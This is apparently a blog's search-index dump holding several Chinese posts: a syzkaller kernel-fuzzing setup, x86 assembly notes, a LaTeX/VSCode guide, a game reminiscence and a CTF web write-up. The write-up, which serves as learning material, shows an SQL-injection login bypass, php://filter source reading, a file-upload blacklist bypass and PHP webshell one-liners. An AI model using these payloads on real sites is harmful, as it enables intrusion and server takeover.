在.config文件追加如下内容CONFIG_KCOV=yCONFIG_DEBUG_INFO=yCONFIG_DEBUG_INFO_DWARF_TOOLCHAIN_DEFAULT=y # 巨坑，在高版本中还需开启此选项，否则DEBUG_INFO会自动被DEBUG_INFO_NONE覆盖CONFIG_KASAN=yCONFIG_KASAN_INLINE=yCONFIG_KCOV_INSTRUMENT_ALL=yCONFIG_KCOV_ENABLE_COMPARISONS=y # 要求gcc8+CONFIG_CONFIGFS_FS=yCONFIG_SECURITYFS=yCONFIG_DEBUG_KMEMLEAK=yCONFIG_STACKTRACE=y# UBSAN，不可以(和哪些选项?)一起用，会报make编译错误。CONFIG_UBSAN=yCONFIG_UBSAN_SANITIZE_ALL=y# 若想避免后续运行syzkaller的时候出现[FAILED] Failed to start Raise network interfaces.的错误，再追加以下两行CONFIG_CMDLINE_BOOL=yCONFIG_CMDLINE=&quot;net.ifnames=0&quot;# 启用错误注入技术CONFIG_FAULT_INJECTION=yCONFIG_FAULT_INJECTION_DEBUG_FS=yCONFIG_FAULT_INJECTION_USERCOPY=yCONFIG_FAILSLAB=yCONFIG_FAIL_PAGE_ALLOC=yCONFIG_FAIL_MAKE_REQUEST=yCONFIG_FAIL_IO_TIMEOUT=yCONFIG_FAIL_FUTEX=y# 开启namespace sandboxing相关的选项CONFIG_NAMESPACES=yCONFIG_UTS_NS=yCONFIG_IPC_NS=yCONFIG_PID_NS=yCONFIG_NET_NS=yCONFIG_CGROUP_PIDS=yCONFIG_MEMCG=yCONFIG_USER_NS=y# 补充一些被证明有用的选项CONFIG_LOCKDEP=yCONFIG_PROVE_LOCKING=yCONFIG_DEBUG_ATOMIC_SLEEP=yCONFIG_PROVE_RCU=yCONFIG_DEBUG_VM=yCONFIG_REFCOUNT_FULL=yCONFIG_FORTIFY_SOURCE=yCONFIG_HARDENED_USERCOPY=yCONFIG_LOCKUP_DETECTOR=yCONFIG_SOFTLOCKUP_DETECTOR=yCONFIG_HARDLOCKUP_DETECTOR=yCONFIG_BOOTPARAM_HARDLOCKUP_PANIC=yCONFIG_DETECT_HUNG_TASK=yCONFIG_WQ_WATCHDOG=yCONFIG_DEFAULT_HUNG_TASK_TIMEOUT=140CONFIG_RCU_CPU_STALL_TIMEOUT=100# 然后使得上述追加内容生效，注意这六个选项的位置不再位于文件尾部make CC=&quot;/usr/bin/gcc&quot; olddefconfig# 最后开始编译内核（对内存有一定要求，我在虚拟机中编译失败，在台式物理机中5min编译完毕）make CC=&quot;/usr/bin/gcc&quot; -j8# 期间并无报错且最后看到如下输出即编译成功# Kernel: arch/x86/boot/bzImage is ready  (#1)\n\n以下是(较早以前，不具参考价值)一次运行日志的开头部分，所提示not enabled的几个config已经包含在上述配置里。\n\n2022/12/30 03:01:42 code coverage           : enabled2022/12/30 03:01:42 comparison tracing      : CONFIG_KCOV_ENABLE_COMPARISONS is not enabled2022/12/30 03:01:42 extra coverage          : enabled2022/12/30 03:01:42 delay kcov mmap         : enabled2022/12/30 03:01:42 setuid sandbox          : enabled2022/12/30 03:01:42 namespace sandbox       : /proc/self/ns/user does not exist2022/12/30 03:01:42 Android sandbox         : enabled2022/12/30 03:01:42 fault injection         : CONFIG_FAULT_INJECTION is not enabled2022/12/30 03:01:42 leak checking           : CONFIG_DEBUG_KMEMLEAK is not enabled2022/12/30 03:01:42 net packet injection    : /dev/net/tun does not exist2022/12/30 03:01:42 net device setup        : enabled2022/12/30 03:01:42 concurrency sanitizer   : /sys/kernel/debug/kcsan does not exist2022/12/30 03:01:42 devlink PCI setup       : PCI device 0000:00:10.0 is not available2022/12/30 03:01:42 NIC VF setup            : PCI device 0000:00:11.0 is not available2022/12/30 03:01:42 USB emulation           : /dev/raw-gadget does not exist2022/12/30 03:01:42 hci packet injection    : /dev/vhci does not exist2022/12/30 03:01:42 wifi device emulation   : /sys/class/mac80211_hwsim/ does not exist2022/12/30 03:01:42 802.15.4 emulation      : /sys/bus/platform/devices/mac802154_hwsim does not exist2022/12/30 03:01:42 corpus                  : 0 (deleted 0 broken)2022/12/30 03:01:44 seeds                   : 165/685\n4 创建虚拟机\n创建image（注意，自2023-04-12 syzkaller的d4d447c commit之后，create-image.sh中的默认release由stretch变更为了bullseye）\n\n# 在创建一个image目录mkdir image &amp;&amp; cd imagecp ../syzkaller/tools/create-image.sh ./chmod u+x create-image.sh# debian的镜像太慢了，可切换到清华源 https://mirrors.tuna.tsinghua.edu.cn/debian/sed -i &#x27;s/http:\\/\\/deb.debian.org\\/debian-ports/https:\\/\\/mirrors.tuna.tsinghua.edu.cn\\/debian\\//g&#x27; create-image.sh./create-image.sh# 看到如下warning是正常现象，说明没有debian-archive-keyring，如果网络正常可以按照其替代方案切换到mirror https://deb.debian.org/debian并继续执行# I: Keyring file not available at /usr/share/keyrings/debian-archive-keyring.gpg; switching to https mirror https://deb.debian.org/debian# 也可以通过安装debian-archive-keyring来避免该warning（可选）sudo apt install -y debian-archive-keyring# 执行create-image.sh完毕后看到目录有如下内容即为成功chroot  create-image.sh  stretch.id_rsa  stretch.id_rsa.pub  stretch.img# 2023-05-04补充说明：最新版create-image.sh执行结果如下，随后与之相关的boot.sh和my.cfg中的stretch*都要改为bullseye*chroot  create-image.sh  bullseye.id_rsa  bullseye.id_rsa.pub  bullseye.img  \n\n安装qemu虚拟机\n\n# 在当前image目录创建boot.sh，注意路径的指向要正确# x86_64/boot/bzImage是x86/boot/bzImage的软链接qemu-system-x86_64 \\ -kernel ../kernels/linux-6.1.12/arch/x86/boot/bzImage \\ -append &quot;console=ttyS0 root=/dev/sda debug earlyprintk=serial slub_debug=QUZ&quot;\\ -hda ./bullseye.img \\ -net user,hostfwd=tcp::16112-:22 -net nic   \\ -enable-kvm \\ -nographic \\ -m 2560M \\ -smp 2 \\ -pidfile vm.pid \\ 2&gt;&amp;1 | tee vm.log # 运行boot.sh启动虚拟机，以root用户无密码登录chmod u+x boot.sh./boot.sh# 然后测试qemu虚拟机的ssh服务是否成功启动ssh -i bullseye.id_rsa -p 16112 -o &quot;StrictHostKeyChecking no&quot; root@localhost\n5 运行syzkaller\n创建syzkaller配置文件\n\n注意：为了避免出现[FAILED] Failed to start Raise network interfaces.的错误，要在下述配置文件加入”cmdline”: “net.ifnames=0”或者在.config中追加CMDLINE相关的两条配置项\n# 在syzkaller目录下创建workdircd syzkallermkdir workdir# 在syzkaller目录下创建my.cfg，各选项均采用绝对路径&#123;    &quot;target&quot;: &quot;linux/amd64&quot;,    &quot;http&quot;: &quot;127.0.0.1:56741&quot;,    &quot;workdir&quot;: &quot;/home/zzy/kernel-fuzz/syzkaller/workdir&quot;,    &quot;kernel_obj&quot;: &quot;/home/zzy/kernel-fuzz/kernels/linux-6.1.12&quot;,    &quot;image&quot;: &quot;/home/zzy/kernel-fuzz/image/bullseye.img&quot;,    &quot;sshkey&quot;: &quot;/home/zzy/kernel-fuzz/image/bullseye.id_rsa&quot;,    &quot;syzkaller&quot;: &quot;/home/zzy/kernel-fuzz/syzkaller&quot;,    &quot;procs&quot;: 8,    &quot;type&quot;: &quot;qemu&quot;,    &quot;vm&quot;: &#123;        &quot;count&quot;: 8,        &quot;kernel&quot;: &quot;/home/zzy/kernel-fuzz/kernels/linux-6.1.12/arch/x86/boot/bzImage&quot;,        # &quot;cmdline&quot;: &quot;net.ifnames=0&quot;,        # &quot;cpu&quot;: 2,        &quot;mem&quot;: 2048    &#125;&#125;\n\n开始内核模糊测试\n\n# 将日志写入./bench.log./bin/syz-manager -config my.cfg -bench bench.log# 如果出现Is another process using the image [/home/zzy/kernel-fuzz/image/stretch.img]?提示# 则说明之前boot.sh开启的qemu虚拟机尚未关机，进入到该虚拟机执行关机命令poweroff即可\n\n在 http://localhost:56741/ 查看fuzz的进度和结果。关于web ui界面中coverage的数据P1%(P2%) of N1(N2)的含义，我通过分析源码pkg/cover/html.go理解了它们的含义。\n\n// pkg/cover/html.go...&#123;&#123;define &quot;dir&quot;&#125;&#125;    &#123;&#123;range $dir := .Dirs&#125;&#125;        &lt;li&gt;            &lt;span id=&quot;path/&#123;&#123;$dir.Path&#125;&#125;&quot; class=&quot;caret hover&quot;&gt;                &#123;&#123;$dir.Name&#125;&#125;                &lt;span class=&quot;cover hover&quot;&gt;                    &#123;&#123;if $dir.Covered&#125;&#125;&#123;&#123;$dir.Percent&#125;&#125;%(&#123;&#123;$dir.PercentInCoveredFunc&#125;&#125;%)&#123;&#123;else&#125;&#125;---&#123;&#123;end&#125;&#125;                    &lt;span class=&quot;cover-right&quot;&gt;of &#123;&#123;$dir.Total&#125;&#125;(&#123;&#123;$dir.TotalInCoveredFunc&#125;&#125;)&lt;/span&gt;                &lt;/span&gt;            &lt;/span&gt;            &lt;ul class=&quot;nested&quot;&gt;                &#123;&#123;template &quot;dir&quot; $dir&#125;&#125;            &lt;/ul&gt;        &lt;/li&gt;    &#123;&#123;end&#125;&#125;    &#123;&#123;range $file := .Files&#125;&#125;        &lt;li&gt;&lt;span class=&quot;hover&quot;&gt;            &#123;&#123;if $file.Covered&#125;&#125;                &lt;a href=&quot;#&#123;&#123;$file.Path&#125;&#125;&quot; id=&quot;path/&#123;&#123;$file.Path&#125;&#125;&quot; onclick=&quot;onFileClick(&#123;&#123;$file.Index&#125;&#125;)&quot;&gt;                    &#123;&#123;$file.Name&#125;&#125;                &lt;/a&gt;                &lt;span class=&quot;cover hover&quot;&gt;                    &lt;a href=&quot;#&#123;&#123;$file.Path&#125;&#125;&quot; id=&quot;path/&#123;&#123;$file.Path&#125;&#125;&quot;                        onclick=&quot;&#123;&#123;if .HasFunctions&#125;&#125;onPercentClick&#123;&#123;else&#125;&#125;onFileClick&#123;&#123;end&#125;&#125;(&#123;&#123;$file.Index&#125;&#125;)&quot;&gt;                                                &#123;&#123;$file.Percent&#125;&#125;%(&#123;&#123;$file.PercentInCoveredFunc&#125;&#125;%)                    &lt;/a&gt;                    &lt;span class=&quot;cover-right&quot;&gt;of &#123;&#123;$file.Total&#125;&#125;(&#123;&#123;$file.TotalInCoveredFunc&#125;&#125;)&lt;/span&gt;                &lt;/span&gt;            &#123;&#123;else&#125;&#125;                    &#123;&#123;$file.Name&#125;&#125;&lt;span class=&quot;cover hover&quot;&gt;---&lt;span class=&quot;cover-right&quot;&gt;                        of &#123;&#123;$file.Total&#125;&#125;&lt;/span&gt;&lt;/span&gt;            &#123;&#123;end&#125;&#125;        &lt;/span&gt;&lt;/li&gt;    &#123;&#123;end&#125;&#125;&#123;&#123;end&#125;&#125;...\n由此可知，P1%的含义是file.Percent大概是PC覆盖占比，对应N1为file.TotalPC覆盖总数。P2%的含义是file.PercentInCoveredFunc函数覆盖占比，对应N2为file.TotalInCoveredFunc函数覆盖总数\n上面这段划掉，我还没搞清楚…\n6 调试内核参见内核Fuzz技巧与备忘: qemu+gdb调试内核\n7 参考[1] Setup: Ubuntu host, QEMU vm, x86-64 kernel\n[2] 零基础syzkaller挖掘Linux内核漏洞\n[3] Syzkaller安装 Fuzz Qemu amd64 Kernel\n[4] syzkaller官方troubleshooting\n[5] syzkaller官方kernel_configs\n","categories":["Fuzz"],"tags":["Fuzz","Kernel","Syzkaller"]},{"title":"x86汇编学习笔记(二)","url":"/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%BA%8C/","content":"1 win32的汇编开发流程\n\n2 win32汇编源程序的结构Hello world程序在DOS汇编：\n;堆栈段stack        segment stack            db\t\t100 dup (?)stack         ends;数据段data        segmentszHello        db\t\t&#x27;Hello, world&#x27;,0dh,0ah,&#x27;$&#x27;data        ends;代码段code        segment            assume\tcs:code,ds:data,ss:stackstart:            mov\tax,data            mov ds,ax                    mov ah,9            mov dx,offset,szHello            int 21hcode        ends            end\t\tstart\nHello world的Win32程序：\n        .386        .model flat,stdcall        option casemap:none;include定义include        windows.incinclude     user32.incinclude     user32.libinclude        kernel32.incinclude     kernel32.lib;数据段        .dataszCaption    db\t\t&#x27;A MessageBox&#x27;,0szText        db\t\t&#x27;Hello, world&#x27;,0;代码段        .codestart:        invoke\tMessageBox, NULL, offset szText, offset szCaption, MB_OK        invoke \tExitProcess, NULL                end \tstart\n2.1 模式定义2.1.1 指定使用的指令集.386是汇编的伪指令，用于告诉编译器在本程序中使用的指令集为80386所拥有的指令集。类似的指令还有：.8086, .186, .386p, .486/486p, .586/.586p等。后面带p的伪指令表示程序中可以使用特权指令(必须在特权级0上运行的指令)如：mov cr0, eax\n2.1.2 .model语句用来定义程序工作的模式。用法如下：\n.model 内存模式 [, 语言模式] [, 其他模式]\n\n\n\n\n模式\n内存使用方式\n\n\n\n\ntiny\n用来建立 .com文件，所有代码、数据和堆栈都在同一个64KB段内\n\n\nsmall\n建立代码和数据分别别用一个64KB段的 .exe文件\n\n\nmedium\n代码段可以有多个64KB段，数据段只有一个64KB段\n\n\ncompact\n代码段只有一个64KB段，数据段可以有多个64KB段\n\n\nlarge\n代码段和数据段都可以由多个64KB段\n\n\nhuge\n同large，并且数据段中的一个数组也可以超过64KB\n\n\nflat\nWin32程序使用的模式，代码和数据段使用同一个4GB段\n\n\n\n\n对于运行在保护模式下的win32程序，它只有一种内存模式——flat模式，即每一个应用程序都拥有其相互独立的4GB地址空间。\n2.1.3 option语句option casemap:none，该语句定义了程序中变量和子程序名是否对大小写敏感。由于Win32 API名称是区分大小写的，故在win32汇编程序中必须指定此语句。\n2.2 段的定义2.2.1 段的概念一个包含全部段的源程序结构：\n.386.model flat, stdcalloption casemap:none&lt;include statements&gt;.stack [堆栈段的大小].data&lt;一些初始化过的变量定义&gt;.data?&lt;一些没有初始化过的变量定义&gt;.const&lt;一些常量定义&gt;.code&lt;代码&gt;&lt;开始标号&gt;    &lt;语句&gt;end 开始标号    \n\n其中.stack, .data, .data?, .const和.code都是分段伪指令。\nWin32只有代码和数据段之分，因此.data, .data?和.const属于数据段，.code属于代码段。\n与DOS汇编不同，Win32汇编不必考虑堆栈，.stack段定义常常被忽略。\n\n2.2.2 数据段.data，.data?和.const定义在数据段，分别对应不同方式的数据定义，在最后生成的可执行文件中也放置在不同的节区(Section)。程序中的数据定义一般可以归纳为三类：\n\n可读可写的已定义变量。被定义在.data段，具有以下性质：\n在源程序已经被定义了初始值。\n具有可读可写性。\n在程序装入完成之后，这些值存在于内存中。\n.data段一般存放在可执行文件的_DATA节区内。\n\n\n可读可写的未定义变量。可定义在.data段，也可以定义在.data?段，具有以下性质：\n一般用作缓冲区，或者程序执行后在开始使用。\n若定义在.data段，则编译器在生成可执行文件时会保留声明大小的空间，即使它们是全0\n若定义在.data?段，则编译器在生成可执行文件时只会记录空间大小信息，不会浪费磁盘空间，而是在程序执行时才会用到。\n.data?段在可执行文件中一般放在_BSS节区。\n\n\n常量。如一些要显示的字符串信息。\n它们在程序装入时就已经有效，但在整个执行过程中不需要修改。\n具有可读不可写性。\n如果程序对.const段进行写操作，会引起保护错误并结束程序。\n\n\n\n2.2.3 代码段\n.code段时代码段，所有的指令都必须写在代码段中\n在可执行文件中，代码段一般放在_TEXT节区。\nWin32环境下的数据段是不可执行的，只有代码段有可执行的属性。（特权级0下运行的程序对所有段有读写权限）\n\n2.2.4 堆栈段\nWin32程序中不必定义堆栈段，系统会自动分配堆栈空间。\n堆栈段的内存属性是可读写并可执行的。（靠动态修改代码的反跟踪模块可以拷贝到堆栈中边修改边执行）\n\n2.3 程序入口与结束\n汇编源程序中，并没有main函数来指定开始执行的地方。取而代之的是程序的最后一句的end语句end     [开始地址]\n上述语句的开始地址就是源程序从代码段开始执行的地址。\n上述语句同时还表示源程序结束，所有代码都必须在end语句之前。\n多模块程序编写时，单一的模块可以没有入口标号，但是最后把多个模块连接在一起时，必须有一个主模块的入口地址被指明。\n\n3 API的调用3.1 API是什么3.2 如何调用3.3.1 invoke语句3.3.2 函数的声明与返回值3.3.3 include语句","categories":["Notes"],"tags":["x86 Assembly"]},{"title":"x86汇编学习笔记(三)","url":"/2019/09/30/x86%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E4%B8%89/","content":"本文主要介绍x86汇编中的标号、变量与数据结构，子程序调用和高级语法。\n\n标号、变量与数据结构标号标号的定义MASM中的@@变量全局变量局部变量变量的访问数据结构子程序高级语法条件分支循环","tags":["x86 Assembly"]},{"title":"【LaTeX】VSCode环境配置","url":"/2020/01/23/%E3%80%90LaTeX%E3%80%91VSCode%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/","content":"LaTeX + VSCode，新姿势增长了，奇怪的知识也增加了！\n\n1 安装TeXlive\n前往官网下载安装程序：\nWindows安装包\nUnix安装包\nMacTeX安装包\n\n\n前往国内镜像站下载：华中大镜像站， 清华大学镜像站， 中科大镜像站\n\n添加环境变量，并确认可用性\n\n\nλ tex -vTeX 3.14159265 (TeX Live 2019/W32TeX)kpathsea version 6.3.1Copyright 2019 D.E. Knuth.There is NO warranty.  Redistribution of this software iscovered by the terms of both the TeX copyright andthe Lesser GNU General Public License.For more information about these matters, see the filenamed COPYING and the TeX source.Primary author of TeX: D.E. Knuth.\n2 配置VSCode2.1 安装LaTeX-Workshop插件\n2.2 设置VSCode配置文件settings.json\n&#123;    &quot;latex-workshop.latex.recipes&quot;: [        &#123;            &quot;name&quot;: &quot;lualatex-&gt;bibtex-&gt;lualatex*2&quot;,            &quot;tools&quot;: [                &quot;lualatex&quot;,                &quot;bibtex&quot;,                &quot;lualatex&quot;,                &quot;lualatex&quot;,            ]        &#125;    ],    &quot;latex-workshop.latex.tools&quot;: [        &#123;            &quot;name&quot;: &quot;lualatex&quot;,            &quot;command&quot;: &quot;lualatex&quot;,            &quot;args&quot;: [                &quot;-synctex=1&quot;,                &quot;-interaction=nonstopmode&quot;,                &quot;-file-line-error&quot;,                &quot;%DOCFILE%&quot;            ]        &#125;,        &#123;            &quot;name&quot;: &quot;bibtex&quot;,            &quot;command&quot;: &quot;bibtex&quot;,            &quot;args&quot;: [                &quot;%DOCFILE%&quot;            ]        &#125;,    ],    &quot;latex-workshop.view.pdf.viewer&quot;: &quot;tab&quot;,    # &quot;latex-workshop.latex.autoBuild.run&quot;: &quot;never&quot;&#125;\n2.3 使用说明\n当你在VSCode编辑.tex格式的文件时，LaTeX-Workshop插件会开始工作\n\n编译生成pdf的指令为Ctrl + Alt + B\n\nCtrl + S保存文件的同时会默认执行编译，若想去除此机制，可以在json设置文件中的加入：\n&quot;latex-workshop.latex.autoBuild.run&quot;: &quot;never&quot;\n\n\n3 用LaTeX编译第一个pdf新建hello.tex文件\n\\documentclass&#123;article&#125;  % 选择模版，使用Latex自带的article模版\\author&#123;my name&#125;\\title&#123;Title&#125;\\usepackage&#123;graphicx&#125;   % 插入图片用到的宏包\\usepackage&#123;multirow&#125;   % 插入表格用到的宏包\\begin&#123;document&#125; \\maketitle    \\section&#123;Hello China&#125; China is in East Asia. \\subsection&#123;Hello Hubei&#125; Hubei Province is located in central China.    \\subsubsection&#123;Hello Wuhan&#125;         \\paragraph&#123;HUST&#125;is Huazhong University of Science and Technology.         \\subparagraph&#123;Dian Group&#125; is a student innovation technology team.    \\subsection&#123;Test&#125;        \\centering        \\begin&#123;tabular&#125;&#123;|c|c|c|c|&#125;         \\hline         t &amp; e &amp; s &amp; t\\\\         \\hline         1 &amp; 2 &amp; 3 &amp; 4\\\\         \\hline         \\end&#123;tabular&#125;\\end&#123;document&#125; \n","categories":["Configuration"],"tags":["LaTeX","VSCode"]},{"title":"NeSE丙升乙CTF升级赛Writeup","url":"/2022/10/03/%E4%B8%99%E5%8D%87%E4%B9%99CTF%E5%8D%87%E7%BA%A7%E8%B5%9Bwriteup/","content":"10月2日NeSE丙组升乙组CTF升级赛Writeup\n\n还是Too naive了，只做出来一题+两个半题\nWebezweb1 登录首先是一个系统登录界面，直接尝试诸如admin，test提示用户名密码错误之后，采用绕过密码判断admin&#39; or 1=1#成功登录。（虽然后来不知道谁把admin密码置空了，可以直接登录admin，但影响不大，不管用什么账户登录都可以进行后续的文件上传）\n  \n\n2 分析在首页综合管理乱点一通无果之后，切换到用户列表，看到有所有用户个人信息：\n\n\n.center \n{\n  width: auto;\n  display: table;\n  margin-left: auto;\n  margin-right: auto;\n}\n\n\n\n\n\n|  ID  | User |            EmailAddress             | LastLogin           |\n| :--: | :--: | :---------------------------------: | ------------------- |\n|  1   | ads  | [qqq@mail.com](mailto:qqq@mail.com) | 2019-08-07 13:00:00 |\n\n\n\n似乎并没有什么用，拉到最底下发现有提示\n\n是提示Please input “?f=aab.php”，应该是可以包含任意文件。继续切到修改个人信息，发现可以修改管理员个人信息，此处可利用头像上传文件。然后结合之前的提示?f=*php和php伪协议读取源码\n# 首先通过php://filter读取目标源码的base64http://124.16.75.162:31010/table.php?f=php://filter/read=convert.base64-encode/resource=/var/www/html/info.php# 然后再base64解码得到源码\n\ninfo.php（关键部分源码）\n\n&lt;?phpif (isset($_POST[&#x27;address&#x27;])) &#123;    ...    if (isset($_FILES)) &#123;        if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) &#123;            echo &quot;错误：&quot; . $_FILES[&quot;file&quot;][&quot;error&quot;] . &quot;&lt;br&gt;&quot;;        &#125; else &#123;            function deldot($s)&#123;                for($i = strlen($s)-1;$i&gt;0;$i--)&#123;                    $c = substr($s,$i,1);                    if($i == strlen($s)-1 and $c != &#x27;.&#x27;)&#123;                        return $s;                    &#125;                         if($c != &#x27;.&#x27;)&#123;                        return substr($s,0,$i+1);                    &#125;                &#125;            &#125;            $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.ini&quot;,&quot;.htaccess&quot;);            $file_name = trim($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);            $file_name = deldot($file_name);            //echo $file_name;            $file_ext = strrchr($file_name, &#x27;.&#x27;);            $file_ext = strtolower($file_ext);             $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);            $file_ext = trim($file_ext);                        if (!in_array($file_ext, $deny_ext)) &#123;                $name =$_FILES[&quot;file&quot;][&quot;name&quot;] ;                //$temp_file = $_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;];                //$img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name;                $content = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);                $content = str_replace(&#x27;?&#x27;, &#x27;!&#x27;, $content);                                if (file_exists(&quot;upload/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]))                &#123;                    echo &quot;&lt;script&gt;alert(&#x27;文件已经存在&#x27;);&lt;/script&gt;&quot;;                &#125;                else&#123;                    move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;assets/images/avatars/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;]);                    file_put_contents(&quot;assets/images/avatars/&quot; . $_FILES[&quot;file&quot;][&quot;name&quot;], $content);                    $helper = new sqlhelper();                    $sql = &quot;UPDATE  admin SET icon=&#x27;$name&#x27; WHERE id=$_SESSION[id]&quot;;                    $helper-&gt;execute_dml($sql);                &#125;            &#125; else &#123;                echo &quot;&lt;script&gt;alert(&#x27;不允许上传的类型&#x27;);&lt;/script&gt;&quot;;            &#125;        &#125;    &#125;&#125;?&gt;\n看到对上传文件的最后一个.后面的扩展名做黑名单限制，以及进行了小写转换、空格去除、特殊敏感字符替换等操作。然后将服务端接收到的文件内容写入assets/images/avatars/上传的文件名。\n3 上传\n首先设计一句话木马：\n\n// 常见的一句话木马因为有?而失效&lt;?php eval(@$_POST[&#x27;cmd&#x27;]);?&gt;    // 于是采用下面的马,一举两得&lt;script language=&quot;php&quot;&gt;phpinfo();eval($_REQUEST[&#x27;cmd&#x27;]);&lt;/script&gt;\n\n然后上传木马，我尝试了各种姿势\n\nburp改文件扩展名，burp改mime type都不行\n%00截断也不行，说明php版本并不低\nzzy.php. .空格绕过也不好使，虽然能上传成功，但好像访问不了==\n…\n最后还是选择用图片马，使用copy命令合并为zzy.php.jpg，然后直接上传成功\n\n\n\n\n\n\n使用蚁剑连接成功\n\nURL地址: http://124.16.75.162:31010/table.php?f=assets/images/avatars/zzy_req.php.jpg\n连接密码: cmd\n(为了确保登录会话的有效，我也在请求信息里传入了Cookie)\n\n\n在根目录下找到flag&#123;flaaaaaaaaaaaaaaaaaaa.ezweb&#125;\n\n\n\n\nsqliTO BE COMPLETED\nReDebuggameTO BE COMPLETED\n","categories":["CTF"],"tags":["NeSE","Writeup"]},{"title":"回味童年小记之造梦西游","url":"/2023/05/28/%E5%9B%9E%E5%91%B3%E7%AB%A5%E5%B9%B4%E5%B0%8F%E8%AE%B0%E4%B9%8B%E9%80%A0%E6%A2%A6%E8%A5%BF%E6%B8%B8/","content":"回味童年小记，又名摸鱼小记\n\n碎念 - 重温童年最近突然很想玩养成宠物类的游戏，还要求宠物拥有各种属性和技能，能够辅助战斗。这类游戏真不好找，首先排除口袋妖怪系列，因为在更久之前我已经重温过一遍究极绿宝石5.4了，现在正处于长草期。然后一番搜索之下，我得到了答案：造梦西游！\n说起来造梦西游，真的是满满的回忆，小学还有初中玩过造梦123，无论是自己玩单人模式的挑战boss的刺激感，还是和同学挤在键盘前一起玩的双人模式的兴奋感……\n\n打开造2，4399真的是良心满满，居然还给我保留着十多年前的存档，造3也一样，2011年的存档依旧在，只是有些遗憾的是我已经回忆不起来当初和我一起玩双人模式的人都有谁了，也许是邻居也许是同班同学。\n最后综合对比了(查知乎)造1~5的玩法与风评，从玩法和可玩性上讲，造12是少于造345的；从经典性上讲造123是大于造45的；从易玩性和战力崩坏上讲，造123是还是优于造45的。所以最后还是选择了造3，重温开温！\n新印象 - 这游戏是真的肝先简单看了一下造3的存档们，发现无论单人还是双人模式等级都不高，游戏内容解锁度也都很低，果然我是萌新呀。所以不如重开新档，正好熟悉一下游戏内容，毕竟之前的记忆已经久远了。\n重来一遍果然发现了许多新鲜有趣的东西，比如小时候玩没加过联盟，比如有很多新出的活动和新出的宠物……还有之前不曾留意过的造梦里的数学问题：各种概率的计算，造3装备打造方案及其计算过程 这篇文章足以窥见冰山一角。\n还有最要命的，就是追求传说装备、饰品和法宝的极限属性。以造3两大废肝王之一的法宝 太极八卦 来举例吧\n\n太极八卦有以下属性需要反复地去双开刷：\n\n成长率：目标3.0，而其范围为1.6-3.0。合成材料成长率拉满为2.5+2.5+1.7的情况下，合成成长率为2.2+rand(0.1, 0.8)。目标概率为\n五行：完美五行是金+木，而每次合成(或者重置)得到的五行一共有  种。目标概率为\n基础词条(究极肝)：\n暴击：目标8%，范围1~8%，样本有限我也不知道最低是多少，姑且认为最低为1%吧\n闪避：目标8%，范围1~8%，不知道最低是多少\n回血：目标28，范围1~28，不太确定有没有0\n回蓝：目标8，范围1~8，不太确定有没有0\n魔抗：目标8%，范围1~8%，不知道最低是多少\n词条目标概率为\n\n\n\n所以太极八卦刷到目标极限属性的概率（草算，不具参考性）为，恐怖至极！就算基础词条的属性下限分别为66116，目标概率也只有，想想就肝疼   :(\n所以啊，还得上脚本！当然是模拟操作的那种脚本，而不是修改器（那样会被踢出联盟的）\n自动化 - 按键精灵之Q语言速成如果有模拟人的键鼠操作的脚本，那么就可以将重复的刷子工作交给机器在闲暇时间来做。答案就是按键精灵。按键精灵采用的是Q语言，是基于VBScript改进的一种易学易用、功能强大的脚本语言。 